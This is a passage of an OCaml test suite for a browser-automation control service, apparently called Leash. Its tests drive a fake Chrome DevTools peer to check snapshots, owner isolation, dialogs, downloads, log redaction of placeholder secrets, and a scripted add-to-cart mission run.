        | `List (x :: _) -> ( match get "name" x with `String s -> s | _ -> "")
        | _ -> "");
      let calls = List.length (Fake.received fake) in
      check_code "tab-1rx9 reject negative offset" "invalid-request"
        (request tabs "alice"
           (P.Snap { tab = h; match_ = None; limit = None; offset = Some (-1) }));
      Alcotest.(check int)
        "tab-1rx9 no CDP on invalid request" calls
        (List.length (Fake.received fake));
      check_code "tab-of0i owner isolation" "not-owner"
        (request tabs "bob"
           (P.Snap { tab = h; match_ = None; limit = None; offset = None }));
      let filtered = snap ~match_:"GO" ~limit:0 () in
      Alcotest.(check int)
        "tab-hyap matched total" 1
        (match get "total" filtered with `Int n -> n | _ -> -1);
      Alcotest.(check bool)
        "tab-1rx9 truncated" true
        (get "truncated" filtered = `Bool true);
      Alcotest.(check bool)
        "tab-1r34 new id" true
        (get "snapshot" first <> get "snapshot" filtered);
      let page = snap ~offset:1 ~limit:1 () in
      Alcotest.(check bool)
        "tab-1rx9 last page" true
        (get "total" page = `Int 2 && get "truncated" page = `Bool false);
      (* tab-tmoc: real Chrome DOMSnapshot bounds are document-relative.
         At scrollY=150, the top heading leaves the viewport while Go stays. *)
      scroll_y := 150;
      let scrolled = snap () in
      Alcotest.(check int)
        "tab-tmoc scrolled total" 1
        (match get "total" scrolled with `Int n -> n | _ -> -1);
      Alcotest.(check string)
        "tab-tmoc scrolled row" "Go"
        (match get "rows" scrolled with
        | `List [ row ] -> ( match get "name" row with `String name -> name | _ -> "")
        | _ -> "");
      Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogOpening"
        ~params:
          (obj
             [
               ("type", str "alert");
               ("message", str "stay here");
               ("url", str "http://localhost/");
               ("hasBrowserHandler", `Bool true);
             ]);
      let rec wait_dialog n =
        if n = 0 then Alcotest.fail "dialog event was not delivered"
        else
          match
            Leash.Tabs.snap tabs ~owner:(owner "alice")
              { tab = h; match_ = None; limit = None; offset = None }
          with
          | Ok { dialog = Some _; _ } -> ()
          | _ ->
              Eio.Fiber.yield ();
              wait_dialog (n - 1)
      in
      wait_dialog 100;
      let dialog = snap () in
      Alcotest.(check bool)
        "tab-0vh8 dialog" true
        (get "message" (get "dialog" dialog) = str "stay here");
      Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogClosed"
        ~params:(obj [ ("result", `Bool false); ("userInput", str "") ]);
      let rec wait_clear n =
        if n = 0 then Alcotest.fail "dialog closure was not delivered"
        else
          let current = snap () in
          if get "dialog" current = `Null then ()
          else (
            Eio.Fiber.yield ();
            wait_clear (n - 1))
      in
      wait_clear 100;
      mutating := true;
      let before = !guard_reads in
      let unsettled = snap () in
      Alcotest.(check bool)
        "tab-of0i unsettled" true
        (get "settled" unsettled = `Bool false);
      Alcotest.(check int) "tab-of0i at most two retakes" 6 (!guard_reads - before);
      let methods =
        Fake.received fake
        |> List.filter_map (fun j ->
            match field "method" j with Some (`String x) -> Some x | _ -> None)
      in
      Alcotest.(check bool)
        "tab-of0i counter installed on attach" true
        (List.mem "Page.addScriptToEvaluateOnNewDocument" methods))

(* fly-iodm: one Runtime.evaluate whose expression contains leash-operator-read.
   Snap and checker expressions keep the recorded guard and innerText answers. Height is
   the fixture's old scroll height, so a page that could scroll down still can. *)
let operator_observation ~text =
  obj
    [
      ("kind", str "leash-operator");
      ("url", str "https://example.com/");
      ("title", str "Example");
      ("timeOrigin", `Int 1);
      ("text", str text);
      ("truncated", `Bool false);
      ("omitted", `Int 0);
      ( "scroll",
        obj
          [
            ("x", `Int 0);
            ("y", `Int 0);
            ("height", `Int 1000);
            ("viewport", `Int 600);
            ("width", `Int 800);
          ] );
      ("semantics", `List []);
      ("guard", obj []);
    ]

let page_evaluate ~text fixture request =
  let expression = get "expression" (get "params" request) in
  match expression with
  | `String "globalThis" -> obj [ ("result", obj [ ("objectId", str "global-object") ]) ]
  | `String s when contains s "leash-operator-read" ->
      obj
        [
          ("result", obj [ ("type", str "object"); ("value", operator_observation ~text) ]);
        ]
  | `String s when String.starts_with ~prefix:"Array.from(document.body?.innerText" s ->
      obj [ ("result", obj [ ("type", str "object"); ("value", str text) ]) ]
  | _ ->
      obj [ ("result", obj [ ("type", str "object"); ("value", get "guard" fixture) ]) ]

(* drive-l7yk drive-8n2z: a real control request, captured headless Chrome
   snapshot replies, scripted decision and no browser mutation. *)
let drive_dry_run () =
  rig (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      Fake.on_method fake "Runtime.evaluate"
        (page_evaluate ~text:"Example content" fixture);
      Fake.on_method fake "Runtime.callFunctionOn" (fun request ->
          let body = get "functionDeclaration" (get "params" request) in
          Alcotest.(check bool)
            "drive-l7yk metric body returns a value" true
            (match body with
            | `String s -> String.starts_with ~prefix:"function(argument) {\nreturn {y:" s
            | _ -> false);
          obj
            [
              ( "result",
                obj
                  [
                    ( "value",
                      obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ]
                    );
                  ] );
            ]);
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      let decisions = ref 0 in
      let decide ~deadline:_ (_ : Leash__Jev_request.request) =
        incr decisions;
        let operation =
          match P.Operation.of_string "click" with Ok x -> x | Error _ -> assert false
        in
        Ok
          Leash__Jev_request.
            {
              operation;
              script = None;
              index = Some 1;
              option = None;
              confidence = 1.;
              target_confidence = None;
              operation_probabilities = [ ("click", 1.) ];
              target_probabilities = [];
              targets = [];
            }
      in
      let wire =
        P.encode_request
          {
            owner = owner "alice";
            command =
              P.Drive
                {
                  tab = Some h;
                  mission = "Open a result";
                  max_steps = None;
                  start_url = Some "https://example.com/";
                  max_procedures = Some 3;
                  expect = None;
                  out = None;
                  deadline_s = Some 30;
                  dry_run = Some true;
                };
          }
        |> Yojson.Safe.to_string
      in
      let reply =
        Leash.Control.handle ~model:"fixture-model" ~decide tabs wire
        |> Yojson.Safe.from_string |> P.decode_reply
      in
      let reply =
        match reply with Ok reply -> result reply | Error why -> Alcotest.fail why
      in
      Alcotest.(check string)
        "drive-l7yk one-step dry-run" "blocked"
        (match get "status" reply with `String s -> s | _ -> "");
      Alcotest.(check int) "drive-l7yk decision once" 1 !decisions;
      Alcotest.(check int)
        "drive-l7yk step once" 1
        (match get "operator_steps" reply with `List xs -> List.length xs | _ -> 0);
      Alcotest.(check bool)
        "drive-l7yk no mutating browser operation" false
        (List.exists
           (fun json ->
             match field "method" json with
             | Some
                 (`String
                    ( "Input.dispatchMouseEvent" | "Input.insertText"
                    | "DOM.scrollIntoViewIfNeeded" )) ->
                 true
             | _ -> false)
           (Fake.received fake)))

(* tab-zc36: a control with an empty accessible name is what an agent still has to act on,
   so it keeps its row with its role, an empty name, and its value or placeholder. The AX
   and DOMSnapshot replies are the recorded headless Chrome 152 shapes for a page with an
   unlabelled native select, a bare text input, an input whose only text is a placeholder,
   and an icon button with no name (test/fixtures/unlabelled-controls-chrome.json). *)
let empty_names () =
  rig (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      let guard = get "guard" fixture in
      Fake.on_method fake "Runtime.evaluate" (fun _ ->
          obj [ ("result", obj [ ("type", str "object"); ("value", guard) ]) ]);
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      let snapshot () =
        result
          (request tabs "alice"
             (P.Snap { tab = h; match_ = None; limit = None; offset = None }))
      in
      let rows json = match get "rows" json with `List rows -> rows | _ -> [] in
      let value row = match field "value" row with Some (`String v) -> v | _ -> "" in
      let named role name json =
        List.find_opt
          (fun row -> get "role" row = str role && get "name" row = str name)
          (rows json)
      in
      let first = snapshot () in
      (match named "combobox" "" first with
      | Some row ->
          Alcotest.(check string)
            "tab-zc36 the unlabelled select keeps its value" "Alpha" (value row)
      | None -> Alcotest.fail "tab-zc36 the unlabelled select is missing from the table");
      (match named "textbox" "" first with
      | Some _ -> ()
      | None -> Alcotest.fail "tab-zc36 the bare text input is missing from the table");
      (match named "button" "" first with
      | Some _ -> ()
      | None -> Alcotest.fail "tab-zc36 the icon button is missing from the table");
      (match named "textbox" "Search terms" first with
      | Some _ -> ()
      | None -> Alcotest.fail "tab-zc36 the placeholder-named input is missing");
      Alcotest.(check bool)
        "tab-zc36 every row has an index to act on" true
        (List.for_all
           (fun row -> match field "index" row with Some (`Int i) -> i > 0 | _ -> false)
           (rows first));
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ ->
          nameless_placeholder (get "ax" fixture));
      let second = snapshot () in
      Alcotest.(check bool)
        "tab-zc36 a nameless control shows its placeholder" true
        (List.exists
           (fun row -> get "name" row = str "" && value row = "Search terms")
           (rows second)))

(* tab-bw4j, L34: a button icon's ::before pseudo-element belongs to its row,
   while an unrelated overlay does not. *)
let pseudo_icon_hit () =
  rig (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      Fake.on_method fake "Runtime.evaluate" (fun _ ->
          obj [ ("result", obj [ ("value", get "guard" fixture) ]) ]);
      Fake.on_method fake "Accessibility.getPartialAXTree" (fun _ ->
          obj
            [
              ( "nodes",
                `List
                  [
                    obj
                      [
                        ("role", obj [ ("value", str "button") ]);
                        ("name", obj [ ("value", str "") ]);
                      ];
                  ] );
            ]);
      Fake.on_method fake "DOM.describeNode" (fun request ->
          let icon =
            obj
              [
                ("backendNodeId", `Int 30);
                ("pseudoElements", `List [ obj [ ("backendNodeId", `Int 894) ] ]);
              ]
          in
          let node = [ ("nodeId", `Int 29); ("backendNodeId", `Int 29) ] in
          let depth = field "depth" (get "params" request) in
          obj
            [
              ( "node",
                obj
                  (if depth = Some (`Int (-1)) then ("children", `List [ icon ]) :: node
                   else node) );
            ]);
      Fake.on_method fake "DOM.getContentQuads" (fun _ ->
          obj
            [
              ( "quads",
                `List
                  [
                    `List
                      (List.map
                         (fun x -> `Float x)
                         [ 10.; 10.; 50.; 10.; 50.; 30.; 10.; 30. ]);
                  ] );
            ]);
      let hit = ref 894 in
      Fake.on_method fake "DOM.getNodeForLocation" (fun _ ->
          obj [ ("backendNodeId", `Int !hit) ]);
      let tab = result (request tabs "alice" (P.New { url = None })) |> tab in
      let observed =
        result
          (request tabs "alice"
             (P.Snap { tab; match_ = None; limit = None; offset = None }))
      in
      let rows = match get "rows" observed with `List rows -> rows | _ -> [] in
      let index =
        match
          List.find_opt
            (fun row -> get "role" row = str "button" && get "name" row = str "")
            rows
        with
        | Some row -> ( match get "index" row with `Int i -> i | _ -> assert false)
        | None -> Alcotest.fail "icon button absent from snapshot"
      in
      let snapshot =
        match get "snapshot" observed with
        | `String id -> (
            match P.Snapshot_id.of_string id with
            | Ok id -> id
            | Error why -> Alcotest.fail why)
        | _ -> Alcotest.fail "snapshot id missing"
      in
      ignore (result (request tabs "alice" (P.Click { tab; snapshot; index })));
      let dispatched () =
        Fake.received fake
        |> List.filter (fun json ->
            field "method" json = Some (str "Input.dispatchMouseEvent"))
        |> List.length
      in
      let before = dispatched () in
      Alcotest.(check int) "tab-bw4j pseudo-icon dispatched press and release" 2 before;
      hit := 999;
      check_code "tab-bw4j unrelated overlay still blocks click" "row-not-actionable"
        (request tabs "alice" (P.Click { tab; snapshot; index }));
      Alcotest.(check int)
        "tab-bw4j overlay dispatches no mouse input" before (dispatched ()))

(* svc-p67t svc-qilu: inspect every command anchor and every journal line of a
   scripted owner session; page data and credentials must never become a log line. *)
let journal_redaction () =
  let module L = Ox_observability.Logger in
  let memory = L.Memory.create () in
  rig ~reporter:(L.Memory.reporter memory) (fun env _ _ tabs fake ->
      let logger =
        L.create ~service:"leash-test" ~clock:env#clock ~mono_clock:env#mono_clock
          ~reporter:(L.Memory.reporter memory) ()
      in
      let secret_fill = "fill-secret-do-not-log" in
      let secret_text = "page-text-do-not-log" in
      let api_key = "api-key-do-not-log" in
      let userinfo = "userinfo-do-not-log" in
      (* L36: what the request ring, the cookie jar and the upload path hold is page or
         caller data as well. *)
      let secret_request = "request-secret-do-not-log" in
      let secret_cookie = "cookie-secret-do-not-log" in
      let secret_path = "/nonexistent/path-secret-do-not-log" in
      let url = "https://user:" ^ userinfo ^ "@example.com/" in
      Fake.on_method (fake ()) "Runtime.evaluate" (fun _ ->
          obj [ ("result", obj [ ("value", str secret_text) ]) ]);
      let run who command =
        let request = P.{ owner = owner who; command } in
        let wire = P.encode_request request |> Yojson.Safe.to_string in
        let reply = Leash.Control.handle ~logger tabs wire |> Yojson.Safe.from_string in
        match P.decode_reply reply with Ok result -> result | Error e -> Alcotest.fail e
      in
      let h = result (run "alice" (P.New { url = None })) |> tab in
      let got =
        result (run "alice" (P.Text { tab = h; index = None; max_chars = None }))
      in
      Alcotest.(check string)
        "scripted page text" secret_text
        (match get "text" got with `String s -> s | _ -> Alcotest.fail "text reply");
      let missing =
        match P.Handle.of_string "t_00000000000000000000000000000000" with
        | Ok x -> x
        | Error e -> Alcotest.fail e
      in
      (* The new reads, on a live tab: the results carry the secrets to the owner, and no
         journal line may. *)
      Fake.on_method (fake ()) "Network.getCookies" (fun _ ->
          obj
            [
              ( "cookies",
                `List
                  [
                    obj
                      [
                        ("name", str "sid");
                        ("value", str secret_cookie);
                        ("domain", str "example.com");
                        ("path", str "/");
                        ("expires", `Int (-1));
                        ("httpOnly", `Bool true);
                        ("secure", `Bool true);
                      ];
                  ] );
            ]);
      Fake.emit ~session:"session-1" (fake ()) ~method_:"Network.requestWillBeSent"
        ~params:
          (obj
             [
               ("requestId", str "leak-1");
               ("timestamp", `Float 1.);
               ("type", str "Fetch");
               ( "request",
                 obj
                   [
                     ("url", str ("https://example.com/" ^ secret_request));
                     ("method", str "GET");
                     ("headers", obj [ ("Authorization", str secret_request) ]);
                   ] );
             ]);
      (* Wait for the event without the journal: only the one command below is anchored. *)
      let rec await_ring n =
        match
          Leash.Tabs.net tabs ~owner:(owner "alice")
            { tab = h; match_ = Some secret_request; limit = None; type_ = None }
        with
        | Ok { requests = _ :: _ } -> ()
        | _ ->
            if n = 0 then Alcotest.fail "hard-xg6y the ring never saw the request"
            else (
              Eio.Fiber.yield ();
              await_ring (n - 1))
      in
      await_ring 10_000;
      let listed =
        result
          (run "alice"
             (P.Net { tab = h; match_ = Some secret_request; limit = None; type_ = None }))
      in
      Alcotest.(check bool)
        "the owner is given the request's url" true
        (contains (Yojson.Safe.to_string listed) secret_request);
      let request_data =
        result (run "alice" (P.Net_request { tab = h; id = "leak-1" }))
      in
      Alcotest.(check bool)
        "the owner is given the request's headers" true
        (contains (Yojson.Safe.to_string request_data) secret_request);
      let jar = result (run "alice" (P.Cookies { tab = h })) in
      Alcotest.(check bool)
        "the owner is given the cookie's value" true
        (contains (Yojson.Safe.to_string jar) secret_cookie);
      let snap =
        match P.Snapshot_id.of_string "s_diagnostics" with
        | Ok x -> x
        | Error e -> Alcotest.fail e
      in
      let direction =
        match P.Direction.of_string "down" with Ok x -> x | Error e -> Alcotest.fail e
      in
      let answer =
        match P.Answer.of_string "accept" with Ok x -> x | Error e -> Alcotest.fail e
      in
      let commands =
        P.
          [
            List_tabs { all = false };
            Status;
            Claim { tab = missing };
            Release { tab = missing; force = None };
            Close { tab = missing; force = None };
            Snap { tab = missing; match_ = None; limit = None; offset = None };
            Shot { tab = missing; path = "/tmp/no-shot"; full_page = None };
            Debug { tab = missing; limit = None; clear = None };
            Eval
              {
                tab = missing;
                expression = "return argument";
                argument = Some (str api_key);
                index = None;
                snapshot = None;
              };
            Nav { tab = missing; url };
            Net
              { tab = missing; match_ = Some secret_request; limit = None; type_ = None };
            Net_body { tab = missing; id = secret_request };
            Net_request { tab = missing; id = secret_request };
            Upload { tab = missing; snapshot = snap; index = 0; paths = [ secret_path ] };
            Hover { tab = missing; snapshot = snap; index = 0 };
            Cookies { tab = missing };
            Storage
              {
                tab = missing;
                area = Leash.Protocol.Storage_area.of_string "local" |> Result.get_ok;
              };
            Click { tab = missing; snapshot = snap; index = 0 };
            Fill { tab = missing; snapshot = snap; index = 0; text = secret_fill };
            Press { tab = missing; snapshot = snap; index = None; key = "Enter" };
            Select { tab = missing; snapshot = snap; index = 0; option = 0 };
            Scroll { tab = missing; direction; index = None };
            Wait
              {
                tab = missing;
                until =
                  {
                    url_prefix = None;
                    text = None;
                    index_gone = None;
                    dialog = None;
                    changed_since = None;
                  };
                timeout_ms = Some 0;
              };
            Dialog { tab = missing; answer; text = None };
            Handoff { tab = missing; reason = "test"; timeout_s = Some 1 };
            Resume { tab = missing };
            Drive
              {
                tab = Some missing;
                mission = "test";
                max_steps = None;
                start_url = None;
                max_procedures = Some 1;
                deadline_s = Some 1;
                dry_run = Some true;
                expect = None;
                out = None;
              };
          ]
      in
      List.iter (fun command -> ignore (run "alice" command)) commands;
      let records = L.Memory.records memory in
      let anchors = List.filter (fun r -> r.L.msg = "control command") records in
      Alcotest.(check int)
        "one anchor per command"
        (5 + List.length commands)
        (List.length anchors);
      let expected_commands =
        P.New { url = None }
        :: P.Text { tab = h; index = None; max_chars = None }
        :: P.Net { tab = h; match_ = Some secret_request; limit = None; type_ = None }
        :: P.Net_request { tab = h; id = "leak-1" }
        :: P.Cookies { tab = h }
        :: commands
      in
      List.iter2
        (fun (position, command) record ->
          let context key = List.assoc_opt key record.L.context in
          Alcotest.(check (option string)) "owner" (Some "alice") (context "owner");
          Alcotest.(check (option string))
            "cmd"
            (Some (P.command_name command))
            (context "cmd");
          let expected_tab =
            match command with
            | P.New _ | P.List_tabs _ | P.Status -> "-"
            | _ when position >= 1 && position <= 4 -> P.Handle.to_string h
            | _ -> P.Handle.to_string missing
          in
          Alcotest.(check (option string)) "tab" (Some expected_tab) (context "tab"))
        (List.mapi (fun position command -> (position, command)) expected_commands)
        anchors;
      let contains text sub =
        let rec search i =
          i + String.length sub <= String.length text
          && (String.sub text i (String.length sub) = sub || search (i + 1))
        in
        search 0
      in
      List.iter
        (fun record ->
          let line = L.to_string record in
          List.iter
            (fun secret ->
              Alcotest.(check bool) ("redacted " ^ secret) false (contains line secret))
            [
              secret_fill;
              secret_text;
              api_key;
              userinfo;
              secret_request;
              secret_cookie;
              secret_path;
            ])
        records)

(* run-ykq4: no Chrome process; browser-level events and the owner-bound
   protocol response are driven by the scripted CDP peer. *)
let download_events () =
  rig ~download_dir:"/tmp/leash-scripted-downloads" (fun _ _ _ tabs fake ->
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      let fake = fake () in
      let behaviors =
        List.filter
          (fun req -> get "method" req = str "Browser.setDownloadBehavior")
          (Fake.received fake)
      in
      Alcotest.(check int) "run-ykq4 behavior set" 1 (List.length behaviors);
      let setup_closed = ref false in
      List.iter
        (fun req ->
          if get "method" req = str "Target.closeTarget" then
            setup_closed :=
              get "targetId" (get "params" req) = str "download-setup-target";
          if get "method" req = str "Browser.setDownloadBehavior" then
            Alcotest.(check bool)
              "daily-c4cl history bootstrap precedes override" true !setup_closed)
        (Fake.received fake);
      Fake.emit fake ~method_:"Target.attachedToTarget"
        ~params:
          (obj
             [
               ("sessionId", str "download-setup-session");
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "download-setup-target");
                     ("type", str "page");
                     ("url", str "chrome://downloads/");
                     ("title", str "Downloads");
                   ] );
             ]);
      for _ = 1 to 20 do
        Eio.Fiber.yield ()
      done;
      (match get "tabs" (result (request tabs "alice" (P.List_tabs { all = true }))) with
      | `List tabs ->
          Alcotest.(check int)
            "daily-c4cl setup target never registered" 1 (List.length tabs)
      | _ -> Alcotest.fail "tabs list missing");
      let params = get "params" (List.hd behaviors) in
      Alcotest.(check string)
        "run-ykq4 allow" "allow"
        (match get "behavior" params with `String s -> s | _ -> "");
      Alcotest.(check bool)
        "run-ykq4 events enabled" true
        (get "eventsEnabled" params = `Bool true);
      let fixture = Yojson.Safe.from_file "fixtures/download-chrome.json" in
      let begin_ = get "downloadWillBegin" fixture in
      let frame = get "frameId" (get "params" begin_) in
      Fake.emit ~session:"session-1" fake ~method_:"Page.frameNavigated"
        ~params:
          (obj [ ("frame", obj [ ("id", frame); ("url", str "https://example.com/") ]) ]);
      Fake.emit fake ~method_:"Browser.downloadWillBegin" ~params:(get "params" begin_);
      (* run-ykq4, L34 live PDF: the same GUID can arrive twice. One file must
         still have one owner-bound record. *)
      Fake.emit fake ~method_:"Browser.downloadWillBegin" ~params:(get "params" begin_);
      (match get "downloadProgress" fixture with
      | `List events ->
          List.iter
            (fun event ->
              Fake.emit fake ~method_:"Browser.downloadProgress"
                ~params:(get "params" event))
            events
      | _ -> Alcotest.fail "invalid Chrome download fixture");
      let rec done_ attempts =
        let data = result (request tabs "alice" (P.Downloads { tab = h })) in
        match get "downloads" data with
        | `List [ download ] when get "state" download = str "completed" -> download
        | _ when attempts > 0 ->
            Eio.Fiber.yield ();
            done_ (attempts - 1)
        | _ -> Alcotest.fail "run-ykq4 browser events not observed"
      in
      let download = done_ 1000 in
      Alcotest.(check string)
        "run-ykq4 PDF mime" "application/pdf"
        (match get "mime" download with `String s -> s | _ -> "");
      Alcotest.(check string)
        "run-ykq4 path" "<managed-profile>/downloads/sample.pdf"
        (match get "path" download with `String s -> s | _ -> "");
      check_code "run-ykq4 other owner refused" "not-owner"
        (request tabs "bob" (P.Downloads { tab = h })))

let optional_otlp () =
  Ox_test.run (fun env sw ->
      let telemetry =
        Leash.Telemetry.create ~caps:(Ox_test.powerbox ()) ~sw ~net:env#net
          ~clock:env#clock ~endpoint:"http://127.0.0.1:4318" ~headers:[]
      in
      Alcotest.(check int) "enabled reporter" 1 (List.length telemetry.Ox_app.reporters);
      let id = Option.get telemetry.Ox_app.span_ids () in
      Alcotest.(check int) "trace id length" 32 (String.length id))

(* ---------- L31: the run over the fake browser ----------

   run-9ypy run-4j1v run-snk4 run-shgh run-7blx run-fwl8: the whole control seam — a real
   request through {!Leash.Control.handle}, the fake CDP peer, the modelled upper levels
   scripted and the operator level's decision scripted — so the loop is proven without a
   model and without a browser. The page is L30's measured state: the successful Added!
   modal on the offer URL, whose playbook kind is [post-add] because its text marker takes
   priority over the offer URL matcher. *)

module Run = Leash.Run
module Jev = Leash__Jev_request

let modal_text = "Added! Your product has been added to cart. View Cart"
let product_url = "https://automationexercise.com/product_details/1"
let decoded = function Ok reply -> result reply | Error why -> Alcotest.fail why
let reply_of = function Ok reply -> reply | Error why -> Alcotest.fail why

let operation name =
  match P.Operation.of_string name with Ok x -> x | Error _ -> assert false

let decide_done ~deadline:_ (_ : Jev.request) =
  Ok
    Jev.
      {
        operation = operation "done";
        script = None;
        index = None;
        option = None;
        confidence = 1.;
        target_confidence = None;
        operation_probabilities = [ ("done", 1.) ];
        target_probabilities = [];
        targets = [];
      }

(* L32 run-w7ke: the planner answer a test scripts; production's Luna is exercised in
   test/planner_test.ml, and the run's own wiring for a proposal here. *)
let levels_with
    ?(plan =
      Run.{ answer = Fail "nothing left to plan"; expect = []; usage = None; pages = [] })
    answers questions =
  let remaining = ref answers in
  Run.
    {
      choose =
        (fun ~deadline:_ (question : Run.question) ->
          questions := question :: !questions;
          match !remaining with
          | [] -> Alcotest.fail "the run asked for more answers than the test scripted"
          | key :: rest ->
              remaining := rest;
              (* fly-mepw: a scripted site name is the offered book identity, not the
                 site string. Procedure slugs, DONE and BLOCKED are already criteria. *)
              let key =
                if
                  question.name <> "select_playbook"
                  || List.exists (fun (offered, _) -> offered = key) question.criteria
                then key
                else
                  match
                    List.find_opt
                      (fun (offered, description) ->
                        String.starts_with ~prefix:"book:" offered
                        && contains description ("site " ^ key ^ " |"))
                      question.criteria
                  with
                  | Some (offered, _) -> offered
                  | None -> key
              in
              Ok
                Run.
                  {
                    key;
                    probabilities = `Assoc [ (key, `Float 1.) ];
                    confidence = 1.;
                    usage = None;
                    judgments = [];
                  });
      score = (fun ~deadline:_ ~sentence:_ ~state:_ -> Ok 1.);
      plan = (fun ~deadline:_ _ -> Ok plan);
    }

let run_wire ?(who = "alice") ?expect ?tab mission =
  P.encode_request
    {
      owner = owner who;
      command =
        P.Drive
          {
            tab;
            mission;
            max_steps = None;
            start_url = None;
            max_procedures = None;
            deadline_s = None;
            dry_run = None;
            expect;
            out = None;
          };
    }
  |> Yojson.Safe.to_string

(* The page the fake CDP peer serves: the recorded sh*ap*es of the unlabelled-controls
   fixture for the tree and the modal's text for the document. *)
let page_script fake fixture text =
  Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
  Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
  Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
  Fake.on_method fake "Runtime.evaluate" (page_evaluate ~text fixture);
  Fake.on_method fake "Runtime.callFunctionOn" (fun _ ->
      obj
        [
          ( "result",
            obj
              [
                ( "value",
                  obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ] );
              ] );
        ])

(* The registry reads the document's title and committed URL from this query once the load
   is done, which is where the run's page kind comes from. *)
let document_at ~title ~url fake =
  Fake.on_method fake "Target.getTargetInfo" (fun _ ->
      obj
        [
          ( "targetInfo",
            obj
              [
                ("targetId", str "target-1");
                ("type", str "page");
                ("title", str title);
                ("url", str url);
              ] );
        ]);
  Fake.on_method fake "Page.navigate" (fun request ->
      let session =
        match get "sessionId" request with `String s -> s | _ -> assert false
      in
      Fake.emit ~session fake ~method_:"Target.targetInfoChanged"
        ~params:
          (obj
             [
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "target-1");
                     ("type", str "page");
                     ("title", str title);
                     ("url", str url);
                   ] );
             ]);
      Fake.emit ~session fake ~method_:"Page.loadEventFired"
        ~params:(Fake.event "Page.loadEventFired");
      obj [])

(* The rig's clocks are Eio_mock's, so a run whose expectation wait sleeps needs the
   virtual clock moved while it works: this fiber advances it by 100 ms at a time until the
   request is answered. The wait's own timeout bounds it (run-l06s). *)
let with_ticking_clock env sw f =
  let stop = ref false in
  Eio.Fiber.fork ~sw (fun () ->
      let rec tick n =
        if n = 0 || !stop then ()
        else (
          Ox_test.advance env#clock (Ox.Duration.ms 100);
          tick (n - 1))
      in
      tick 5_000);
  Fun.protect ~finally:(fun () -> stop := true) f

let run_mission () =
  rig (fun env sw _ tabs fake ->
      let f = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      page_script f fixture modal_text;
      document_at ~title:"Blue Top" ~url:product_url f;
      let playbook =
        match
          Leash.Playbook.load ~caps:(Ox_test.powerbox ())
            "../examples/playbooks/automationexercise.com"
        with
        | Ok book -> book
        | Error why -> Alcotest.fail why
      in
      let h = result (request tabs "alice" (P.New { url = Some product_url })) |> tab in
      let questions = ref [] in
      let answers = [ "automationexercise.com"; "add-to-cart"; "DONE" ] in
      let base = levels_with answers questions in
      let scored = ref 0 in
      let levels =
        Run.
          {
            base with
            score =
              (fun ~deadline ~sentence ~state ->
                incr scored;
                Leash__Model_usage.start "verifier";
                let result = base.score ~deadline ~sentence ~state in
                Leash__Model_usage.report "verifier" (Some 0.05);
                result);
            plan =
              (fun ~deadline request ->
                Leash__Model_usage.start "planner";
                Leash__Model_usage.report "planner" (Some 0.3);
                Leash__Model_usage.start "planner";
                Leash__Model_usage.report "planner" (Some 0.07);
                base.plan ~deadline request);
          }
      in
      let decide ~deadline request =
        Leash__Model_usage.start "operator";
        let reply = decide_done ~deadline request in
        Leash__Model_usage.report "operator" (Some 0.4);
        reply
      in
      let reply =
        with_ticking_clock env sw (fun () ->
            Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[ playbook ]
              ~decide tabs
              (run_wire ~tab:h
                 ~expect:[ "checkout looks trustworthy"; "the page is cart" ]
                 "add Blue Top to the cart")
            |> Yojson.Safe.from_string |> P.decode_reply)
      in
      let body = decoded reply in
      let by_kind = get "model_calls_by_kind" (get "data" body) in
      Alcotest.(check bool)
        "extr-5x9e operator JEV calls counted" true
        (match
           List.assoc_opt "operator" (match by_kind with `Assoc xs -> xs | _ -> [])
         with
        | Some (`Int n) -> n > 0
        | _ -> false);
      Alcotest.(check bool)
        "extr-5x9e each retry counted separately" true
        (get "planner" by_kind = `Int 2);
      Alcotest.(check bool)
        ("extr-5x9e verifier calls counted " ^ string_of_int !scored)
        true
        (List.assoc_opt "verifier" (match by_kind with `Assoc xs -> xs | _ -> [])
         = Some (`Int !scored)
        && !scored > 0);
      Alcotest.(check bool)
        "extr-5x9e retry and verifier costs summed" true
        (match get "model_cost" body with
        | `Float n ->
            Float.abs
              (n
              -. (0.37
                 +. (float_of_int !scored *. 0.05)
                 +. 0.4
                    *.
                    match get "operator" by_kind with
                    | `Int n -> float_of_int n
                    | _ -> 0.))
            < 0.00001
        | _ -> false);
      Alcotest.(check string)
        "run-4j1v the Added! modal is not DONE" "blocked"
        (match get "status" body with `String s -> s | _ -> "");
      (match get "procedures" body with
      | `List (entry :: _) ->
          Alcotest.(check string)
            "run-9ypy the procedure the level chose" "add-to-cart"
            (match get "slug" entry with `String s -> s | _ -> "");
          Alcotest.(check string)
            "run-9ypy the procedure verified" "verified"
